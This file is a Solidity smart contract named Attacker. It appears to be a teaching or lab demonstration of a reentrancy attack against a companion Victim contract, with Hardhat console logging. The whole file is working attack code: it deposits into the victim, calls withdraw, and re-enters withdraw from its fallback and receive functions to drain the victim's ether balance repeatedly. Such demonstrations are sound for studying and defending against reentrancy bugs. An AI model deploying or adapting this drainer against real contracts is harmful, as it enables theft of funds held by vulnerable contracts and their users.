// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "./Victim.sol";
import "hardhat/console.sol";

contract Attacker{
    Victim victim;
    address public owner;
    uint public i;

    modifier ownerOnly(){
        require(msg.sender == owner, "OWNER_REQUIRED");
        _;
    }

    fallback() external payable{
        if(msg.sender == address(victim)){
            i += 1;
            console.log("[attack fallback] %s times called, attack_balance:%s , re_balance:%s ", 
                        i, address(this).balance/(10**18), address(victim).balance/(10**18));
            victim.withdraw(address(this), msg.value);
        }
    }

    receive() external payable{
        if(msg.sender == address(victim)){
            i += 1;
            console.log("[attack fallback] %s times called, attack_balance:%s , re_balance:%s ", 
                        i, address(this).balance/(10**18), address(victim).balance/(10**18));
            victim.withdraw(address(this), msg.value);
        }
    }

    constructor() payable{
        owner = msg.sender;
    }

    function setVictim(Victim _victim) public ownerOnly{
        victim = _victim;
    }

    function attack(uint _amount) public ownerOnly{
        victim.deposit{value: _amount}();
        console.log('Deposit', _amount);
        victim.withdraw(address(this), _amount / 2);
    }
    
}